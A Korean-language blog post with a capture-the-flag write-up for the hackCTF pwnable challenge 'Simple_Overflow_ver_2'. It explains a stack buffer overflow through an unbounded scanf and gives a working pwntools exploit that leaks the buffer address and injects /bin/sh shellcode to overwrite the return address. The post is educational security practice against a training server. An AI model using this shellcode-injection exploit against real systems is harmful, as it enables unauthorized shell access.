---
layout: post
title:  "[hackCTF]Simple_Overflow_ver_2"
date:   2020-02-18
---

hackCTF pwnable 7번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // ebx
  char v5; // [esp+13h] [ebp-89h]
  char s[128]; // [esp+14h] [ebp-88h]
  int i; // [esp+94h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0);
  v5 = 121;
  do
  {
    printf("Data : ");
    if ( __isoc99_scanf(" %[^\n]s", s) ) // \n을 받을 때까지 공백을 입력 받아 s에 저장
    {
      for ( i = 0; ; ++i )
      {
        v3 = i;
        if ( v3 >= strlen(s) )
          break; // s의 길이만큼 for문 반복
        if ( !(i & 0xF) ) // 0x0, 0x10이면
          printf("%p: ", &s[i]); // s[i]의 주소 출력
        printf(" %c", (unsigned __int8)s[i]); // s[i]의 값 출력
        if ( i % 16 == 15 ) // 16의 배수번째 글자면
          putchar(10); // new line
      }
    }
    printf("\nAgain (y/n): ");
  }
  while ( __isoc99_scanf(" %c", &v5) && (v5 == 121 || v5 == 89) );
  // 문자열을 입력 받는데 그 값이 "Y" 또는 "y"이면 do-while문을 다시 반복한다
  return 0;
}
```
복잡해보이지만 실은 간단하다.  
문자열을 입력받고 그 문자열 16글자 단위로 나눠서 출력한다.  
이 때 1st, 17th 문자, 33th... 문자는 주소를 출력한다.
<br>

정리해보자.<br><br>

***

| ret |           |
|:---:|:---------:|
| sfp |    ebp    |
| ... |           |
|  i  |  ebp-0x8  |
|  s  |           |
| ... | (128byte) |
|  s  |  ebp-0x88 |
|  v5 |  ebp-0x89 |

***
<br>

![0701](https://drive.google.com/uc?id=1VZWXdm7SKHOD-4lvLfeVyF5fLRko5Z4Z)  
실제로 실행해보면 좀 더 명확히 알 수 있다.<br><br>
지난 6번 문제와 동일한 조건이므로 s의 주소를 알아낸 뒤 쉘코드를 포함한 payload를 완성하면 될 것 같다. 주의해야 할 점은 서버와 나 사이에 데이터 핑퐁이 잘 되어야 한다는 점이다. 이를 위해서 recvuntil함수를 자주 사용하기로 했다.<br><br>
목표 : s의 주소를 서버로 부터 받아 ret을 덮는 payload 완성하기<br>
취약점 : scanf(" %[^\n]s", s)<br><br><br>

## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3006)

# 1st

p.recvuntil("Data : ")

p.sendline("asdf")

buf = int(p.recv(10), 16)

p.recvuntil("Again (y/n): ")

p.sendline("y")

# 2nd

p.recvuntil("Data : ")

payload = "\x90"*0x7

payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

payload += "\x90"*(0x88-0x20+0x4)

payload += p32(buf)

p.sendline(payload)

p.recvuntil("Again (y/n): ")

p.sendline("n")

p.interactive()

```
## 결과
![0702](https://drive.google.com/uc?id=13ENd7UhZJ3NSxpOyoGthlYVWHkv1xJ1t)
